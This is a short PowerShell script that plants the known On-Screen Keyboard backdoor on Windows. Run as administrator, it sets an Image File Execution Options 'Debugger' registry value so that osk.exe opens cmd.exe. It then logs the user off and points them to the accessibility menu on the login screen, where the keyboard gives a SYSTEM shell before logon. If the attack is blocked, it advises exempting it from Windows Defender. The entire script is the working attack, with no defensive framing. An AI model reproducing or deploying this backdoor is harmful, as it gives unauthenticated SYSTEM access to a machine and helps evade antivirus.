# SystemOSK.ps1

Function SystemOSK{
    <#
        .SYNOPSIS
        undefined
        .Description
        undefined
        .Notes
        Initial Draft
    #>
}
#Requires -RunAsAdministrator

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
Start-Sleep 1
osk.exe 


$Answer = Read-Host -Prompt 'Did it open CMD? [Y] or [N]'
if ($Answer -eq 'Y') {
    Write-Output 'Epic ...'
    Start-Sleep 1
    msg * /TIME:10 /V "Logging you off, remember Open OSK.exe from accessibility at bottom left" 
    Start-Sleep 10
    Logoff 
    
} else {
    Write-Output "Check Windows Defender, expect an alert from behaviour analysis."
    Start-Sleep 2
    Write-Output "Either make an exemption or go without it. You should know why a system shell triggers defender"
    Exit
}
